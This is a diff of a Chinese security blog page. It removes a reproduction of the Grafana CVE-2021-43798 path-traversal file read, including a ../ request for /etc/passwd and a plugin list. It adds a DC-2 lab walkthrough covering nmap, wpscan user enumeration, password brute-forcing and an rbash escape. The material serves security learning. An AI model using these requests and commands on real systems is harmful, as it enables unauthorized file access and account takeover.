@@ -3,7 +3,7 @@
         <head>
         <meta name="viewport" content="width=device-width,minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no" />
         <meta charset="utf-8">
-        <title>CVE-2021-43798 Grafana未授权任意文件读取漏洞 | 老白</title>
+        <title>DC-2 | 老白</title>
         <link rel="stylesheet" href="https://V-alkoinen.github.io/styles/main.css">
         <link rel="stylesheet" href="https://at.alicdn.com/t/font_1306644_jwtuc2zzbrd.css">
         <link href="https://cdn.bootcss.com/animate.css/3.7.2/animate.min.css" rel="stylesheet">
@@ -49,100 +49,51 @@
                 <div class="mdui-row">
                         <div class="mdui-col-md-8 mdui-col-offset-md-2 ">
                                 <article class="mdui-p-a-2 post animated fadeIn" style="animation-delay: 0.8s;animation-duration: 2s">
-                                    <div class="post-title  mdui-m-b-1">CVE-2021-43798 Grafana未授权任意文件读取漏洞</div>
-                                    <div class="mdui-typo-body-2 mdui-m-b-2" datetime="2021-12-09 11:20:11">2021-12-09 / 2 min read</div>
-                                    <div class="mdui-m-b-2 mdui-typo post-neirong"><h1 id="一-背景">一、背景</h1>
-<p><a href="https://twitter.com/jas502n/status/1468116658531487747?cxt=HHwWhsDSidKU5t8oAAAA">Grafana未授权任意文件读取漏洞</a><br>
-<img src="https://V-alkoinen.github.io/post-images/1644730783714.png" alt="" loading="lazy"></p>
-<h1 id="二-影响范围">二、影响范围</h1>
-<p>  <code>grafana 8.x</code></p>
-<h1 id="三-漏洞复现">三、漏洞复现</h1>
-<pre><code>docker run --name=grafana -d -p 80:3000 grafana/grafana:8.0.1
+                                    <div class="post-title  mdui-m-b-1">DC-2</div>
+                                    <div class="mdui-typo-body-2 mdui-m-b-2" datetime="2021-11-18 18:50:40">2021-11-18 / 1 min read</div>
+                                    <div class="mdui-m-b-2 mdui-typo post-neirong"><h1 id="端口扫描">端口扫描</h1>
+<p> <code>nmap -T4 -Pn -sV -O 172.16.70.150</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1646736778794.png" alt="" loading="lazy"></p>
+<h1 id="web">web</h1>
+<p> 访问<code>http://172.16.70.150/</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1646736941610.png" alt="" loading="lazy"><br>
+ 301到<code>http://dc-2/</code>，只能加个host<br>
+<img src="https://V-alkoinen.github.io/post-images/1646737040266.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1646737105540.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1646744105922.png" alt="" loading="lazy"><br>
+ 发现是个wordpress，网站提示我们使用<code>cewl</code>生成字典，然后<code>wpscan</code>扫一下<code>wpscan --url http://dc-2 -e u</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1646744232915.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1646744238225.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1646744242876.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1646744247988.png" alt="" loading="lazy"><br>
+ 发现三个用户：<code>admin</code>、<code>jerry</code>、<code>tom</code>，使用wpscan对这三个用户和刚才生成的密码字典进行爆破<br>
+<img src="https://V-alkoinen.github.io/post-images/1646744705845.png" alt="" loading="lazy"><br>
+ 使用两个用户都登陆下后台：<code>http://dc-2/wp-login.php</code>，只找到了一个页面，让我们使用别的方法<br>
+<img src="https://V-alkoinen.github.io/post-images/1646745488406.png" alt="" loading="lazy"><br>
+ 那就ssh尝试连一下<br>
+<img src="https://V-alkoinen.github.io/post-images/1646745543970.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1646745571354.png" alt="" loading="lazy"><br>
+ 执行命令时发现又rbash，尝试绕过rbash</p>
+<pre><code>#绕过rbash
+BASH_CMDS[a]=/bin/sh;a
+
+#添加环境变量
+export PATH=$PATH:/bin/
+export PATH=$PATH:/usr/bin/
 </code></pre>
-<figure data-type="image" tabindex="1"><img src="https://V-alkoinen.github.io/post-images/1644659742530.png" alt="" loading="lazy"></figure>
-<pre><code>GET /public/plugins/cloudwatch/../../../../../../../../../../../../etc/passwd HTTP/1.1
-Host: &lt;host&gt;
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36
-Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8n
-Cookie: redirect_to=%2F
-Connection: close
-</code></pre>
-<p><img src="https://V-alkoinen.github.io/post-images/1644659986203.png" alt="" loading="lazy"><br>
-  通过<code>/api/plugins</code>接口查看所有插件</p>
-<pre><code>GET /api/plugins HTTP/1.1
-Host: &lt;host&gt;
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36
-Accept: */*
-Cookie: grafana_session=ab39f8213543745da2f725f26b026f49
-Connection: close
-</code></pre>
-<figure data-type="image" tabindex="2"><img src="https://V-alkoinen.github.io/post-images/1644660118608.png" alt="" loading="lazy"></figure>
-<pre><code>#默认插件
-alertmanager
-cloud-monitoring
-cloudwatch
-dashboard
-elasticsearch
-grafana
-grafana-azure-monitor-datasource
-graphite
-influxdb
-jaeger
-loki
-mixed
-mssql
-mysql
-opentsdb
-postgres
-prometheus
-tempo
-testdata
-zipkin
-alertGroups
-alertlist
-annolist
-barchart
-bargauge
-candlestick
-canvas
-dashlist
-debug
-gauge
-geomap
-gettingstarted
-graph
-heatmap
-histogram
-icon
-live
-logs
-news
-nodeGraph
-piechart
-pluginlist
-stat
-state-timeline
-status-history
-table
-table-old
-text
-timeseries
-welcome
-xychart
-</code></pre>
-<h1 id="四-漏洞修复">四、漏洞修复</h1>
-<p>  升级<code>grafana</code>至最新版本后(Grafana v8.3.5)，无该问题。<br>
-<img src="https://V-alkoinen.github.io/post-images/1644660299071.png" alt="" loading="lazy"><br>
-<img src="https://V-alkoinen.github.io/post-images/1644660362241.png" alt="" loading="lazy"></p>
+<p><img src="https://V-alkoinen.github.io/post-images/1646745764774.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1646746887853.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1646747512743.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1646748521834.png" alt="" loading="lazy"></p>
 </div>
                                     <div class="mdui-divider mdui-m-b-2"></div>
                                     <div class="mdui-row-xs-2 post-fenye">
                                        
-                                        <div class="mdui-col"> <div class="mdui-text-left"><a href="https://V-alkoinen.github.io/post/cve-2021-42287cve-2021-42278-yi-jian-yu-kong/">CVE-2021-42287/CVE-2021-42278 一键域控</a></div></div>
+                                        <div class="mdui-col"> <div class="mdui-text-left"><a href="https://V-alkoinen.github.io/post/grafana-Unauthorized-reading-of-arbitrary-files/">CVE-2021-43798 Grafana未授权任意文件读取漏洞</a></div></div>
                                         
 
                                         
-                                        <div class="mdui-col"><div class="mdui-text-right "><a href="https://V-alkoinen.github.io/post/dc-2/">DC-2</a></div> </div>
+                                        <div class="mdui-col"><div class="mdui-text-right "><a href="https://V-alkoinen.github.io/post/ CVE-2020-27986-SonarQube-unauthorized/"> CVE-2020-27986 SonarQube未授权访问</a></div> </div>
                                        
                                       </div>
                                    
